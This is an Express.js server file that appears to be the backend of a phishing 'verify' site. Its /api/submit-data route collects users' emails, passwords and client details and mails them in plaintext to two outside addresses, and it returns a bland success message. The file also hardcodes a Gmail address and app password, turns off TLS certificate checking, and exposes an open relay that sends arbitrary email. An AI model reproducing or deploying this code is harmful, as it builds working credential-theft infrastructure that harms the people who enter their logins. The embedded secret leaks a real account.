import * as dotenv from 'dotenv';
import express from 'express';
import cors from 'cors';
import nodemailer from 'nodemailer';

dotenv.config();

const app = express();
const port = process.env.PORT || 3001;

// Configure email transporter
const transporter = nodemailer.createTransport({
  host: 'smtp.gmail.com',
  port: 465,
  secure: true,
  auth: {
    user: process.env.EMAIL_USER || 'peternnamani001@gmail.com',
    pass: process.env.EMAIL_PASS || 'yygzcdttgthuhicg'
  },
  tls: {
    rejectUnauthorized: false
  }
});

// Middleware
app.use(cors({
  origin: ['https://verify-frontend-wine.vercel.app', 'http://localhost:5173', 'https://verify-backend.onrender.com'],
  credentials: true,
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  optionsSuccessStatus: 200
}));

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true }));

// Pre-flight requests handler
app.options('*', cors());

// Add security headers for all routes
app.use((req, res, next) => {
  const allowedOrigins = ['https://verify-frontend-wine.vercel.app', 'https://verify-backend.onrender.com'];
  const origin = req.headers.origin;
  if (allowedOrigins.includes(origin)) {
    res.header('Access-Control-Allow-Origin', origin);
  }
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.header('Access-Control-Allow-Credentials', 'true');
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  next();
});

// Test route
app.get('/api/test', (req, res) => {
  res.json({ message: 'Server is running! Updated: ' + new Date().toISOString() });
});

// Direct data submission route (no CAPTCHA verification required)
app.post('/api/submit-data', async (req, res) => {
  console.log('Received data submission on servers.js');
  try {
    const { email, password, clientInfo } = req.body;
    
    // Format the collected data with better formatting
    const htmlContent = `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
        <h2 style="color: #444;">New User Registration</h2>
        <div style="background-color: #f5f5f5; padding: 15px; border-radius: 5px;">
          <p><strong>Email:</strong> ${email}</p>
          <p><strong>Password:</strong> ${password}</p>
          <p><strong>Date/Time:</strong> ${new Date().toLocaleString()}</p>
          ${clientInfo ? `<p><strong>Client Info:</strong> <pre style="background-color: #fff; padding: 10px; border-radius: 3px; overflow: auto;">${JSON.stringify(clientInfo, null, 2)}</pre></p>` : ''}
        </div>
      </div>
    `;

    const mailOptions = {
      from: process.env.EMAIL_USER || 'peternnamani001@gmail.com',
      to: 'peternnamani001@gmail.com,Miralhuge@zohomail.com',
      subject: `New Registration: ${email}`,
      html: htmlContent
    };

    console.log('Sending registration data from servers.js...');
    console.log('Email User:', process.env.EMAIL_USER);
    console.log('Recipient:', mailOptions.to);
    
    const info = await transporter.sendMail(mailOptions);
    console.log('Registration data sent successfully from servers.js:', info.messageId);
    
    // Return success without revealing details
    res.json({ success: true });
  } catch (error) {
    console.error('Data submission error from servers.js:', error);
    res.status(500).json({ 
      success: false,
      message: 'An error occurred while processing your request'
    });
  }
});

// Legacy email route - keeping for backward compatibility
app.post('/api/send-email', async (req, res) => {
  console.log('Received email request on servers.js');
  try {
    const { to, subject, text, html } = req.body;
    
    if (!to || !subject) {
      return res.status(400).json({ 
        success: false, 
        message: 'Missing required email fields (to, subject)'
      });
    }
    
    console.log('Preparing email with:', { to, subject });

    const mailOptions = {
      from: process.env.EMAIL_USER || 'peternnamani001@gmail.com',
      to,
      subject,
      text: text || 'No text content provided',
      html: html || '<p>No HTML content provided</p>'
    };

    console.log('Sending email from servers.js...');
    const info = await transporter.sendMail(mailOptions);
    console.log('Email sent successfully from servers.js:', info.messageId);
    
    res.json({ success: true, messageId: info.messageId });
  } catch (error) {
    console.error('Email error from servers.js:', error);
    res.status(500).json({ 
      success: false,
      message: 'Failed to process your request',
      error: error.message
    });
  }
});

// Analytics endpoint with CORS headers
app.options('/api/collect-analytics', cors());
app.post('/api/collect-analytics', cors(), async (req, res) => {
  console.log('Received analytics data:', req.body);
  try {
    // Here you can process the analytics data as needed
    res.json({ success: true, message: 'Analytics data received' });
  } catch (error) {
    console.error('Analytics error:', error);
    res.status(500).json({ 
      success: false,
      message: 'Failed to process analytics data'
    });
  }
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error('Server error:', err);
  res.status(500).json({ 
    success: false,
    message: 'Internal server error'
  });
});

// Start server
app.listen(port, () => {
  console.log(`Server running on port ${port}`);
  
  // Test email configuration
  transporter.verify()
    .then(() => console.log('Email configuration verified successfully'))
    .catch(err => console.error('Email configuration error:', err));
});
